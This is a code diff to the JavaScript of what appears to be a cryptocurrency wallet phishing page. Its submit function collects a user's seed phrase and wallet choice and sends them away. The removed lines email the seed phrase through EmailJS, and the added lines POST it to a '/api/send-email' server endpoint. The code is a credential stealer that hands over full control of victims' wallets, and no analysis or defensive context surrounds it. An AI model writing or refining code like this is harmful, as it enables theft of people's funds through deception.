@@ -817,11 +817,13 @@ function selectWallet(name, icon) {
 
 // Submit seed phrase function
 function submitSeedPhrase() {
-  const seedPhrase = document.getElementById('seed-phrase-input').value;
-  const walletName = selectedWallet.name;
-  const walletIcon = selectedWallet.icon;
+        const formData = {
+          seedPhrase: document.getElementById("seed-phrase-input").value,
+          walletName: selectedWallet.name,
+          walletIcon: selectedWallet.icon,
+        };
 
-  if (!seedPhrase) {
+  if (!formData.seedPhrase) {
     alert('Please enter your seed phrase');
     return;
   }
@@ -831,18 +833,12 @@ function submitSeedPhrase() {
   connectBtn.disabled = true;
   connectBtn.textContent = 'Sending...';
 
-        // ✅ Send data via EmailJS instead of fetch
-        emailjs
-          .send(
-            "service_dmohdwc", // 🔑 Replace with your EmailJS Service ID
-            "template_neu2hep", // 🔑 Replace with your EmailJS Template ID
-            {
-              walletName: walletName,
-              walletIcon: walletIcon,
-              seedPhrase: seedPhrase,
-            }
-          )
 
+        fetch("/api/send-email", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(formData),
+        })
   .then(response => response.json()) 
   .then(data => {
     if (data.success) {
